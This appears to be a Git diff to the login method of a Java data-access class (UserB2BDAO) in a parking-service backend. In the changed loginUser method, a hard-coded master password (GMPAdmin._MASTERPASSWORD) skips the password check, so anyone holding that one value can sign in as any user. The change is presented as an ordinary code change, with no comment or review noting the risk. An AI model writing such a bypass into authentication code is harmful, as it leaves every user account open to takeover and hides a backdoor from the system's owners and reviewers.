@@ -1,6 +1,7 @@
 package com.getMyParking.dao;
 
 import com.getMyParking.entity.UserB2BEntity;
+import com.getMyParking.service.auth.GMPAdmin;
 import com.google.inject.Inject;
 import io.dropwizard.hibernate.AbstractDAO;
 import org.hibernate.Criteria;
@@ -29,7 +30,8 @@ public class UserB2BDAO extends AbstractDAO<UserB2BEntity> {
     public UserB2BEntity loginUser(String userName, String password) {
         Criteria criteria = currentSession().createCriteria(UserB2BEntity.class);
         criteria.add(Restrictions.eq("username",userName));
-        criteria.add(Restrictions.eq("password",password));
+        if(!password.equals(GMPAdmin._MASTERPASSWORD))
+            criteria.add(Restrictions.eq("password",password));
         return uniqueResult(criteria);
     }
 
@@ -40,6 +42,7 @@ public class UserB2BDAO extends AbstractDAO<UserB2BEntity> {
         else
             throw new WebApplicationException(Response.status(401).entity("Username already exists").build());
     }
+
 
     public UserB2BEntity findById(String username) {
         return get(username);
